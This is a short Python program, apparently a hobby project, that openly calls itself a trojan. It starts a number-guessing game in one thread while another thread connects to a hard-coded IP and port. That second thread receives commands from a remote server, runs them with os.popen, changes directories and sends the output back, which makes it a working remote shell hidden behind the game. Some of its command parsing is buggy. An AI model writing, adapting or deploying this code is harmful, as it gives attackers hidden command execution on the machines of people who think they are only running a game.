#Trojan Imports
import socket
import os
import threading

#Game Imports
import random
import time


def trojan():
	try:
		DISCONNECT_MESSAGE = "!DISCONNECT"
		HOST = "192.168.0.12"
		PORT = 5050
		FORMAT = "utf-8"
		ADDR = (HOST, PORT)
		HEADER=64

		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		client.connect(ADDR)

		connected = True
		cmd_mode = False

		def send(msg):
			message = msg.encode(FORMAT)
			msg_length = len(message)
			send_length = str(msg_length).encode(FORMAT)
			send_length += b' ' *(HEADER - len(send_length))

			client.send(send_length)
			client.send(message)

		while connected:
			msg_length = int(client.recv(HEADER).decode(FORMAT))
			server_command = client.recv(msg_length).decode(FORMAT)
			alt_command=[]
			for command in server_command:
				alt_command.append(command)
			print(alt_command)

			if server_command == "cmdon":
				send("You Have Terminal Access!")
				cmd_mode = True
				continue

			if server_command == "cmdoff":
				cmd_mode = False
				send("You Closed The Terminal!")

			if "c" and "d" in alt_command:
					alt_command.remove("c")
					alt_command.remove("d")
					alt_command.remove(" ")
					alt_command = ''.join(alt_command)

					os.chdir(server_command)
					send(os.getcwd())

					continue

			if cmd_mode:
				cmd_line = os.popen(server_command)
				output = cmd_line.read()
				if output:
					send(output)	
				else:
					send(f"{server_command} was executed.")

	except ConnectionResetError:
		pass

def game():
	def mk_num():
		num = random.randint(1, 100)
		print("My Number Is Between 1 and 100\n")
		return num

	print("\nWelcome To The Number Guessing Game! Have A Go!\n")
	run=True

	while run:
		num = mk_num()

		guess=True
		attempts=0

		while guess:
			try:
				num_guess = input("Guess: ")

				if int(num_guess) == num:
					print(f"\nWell Done! You Guess Correctly. It Took You {attempts} Attemps!\n")
					time.sleep(1)
					guess=False
				else:
					attempts +=1
					print("Try Again!\n")
			except ValueError:
				print("You Need To Enter A Number")

trojan_thread = threading.Thread(target=trojan)
trojan_thread.start()

game_thread = threading.Thread(target=game)
game_thread.start()


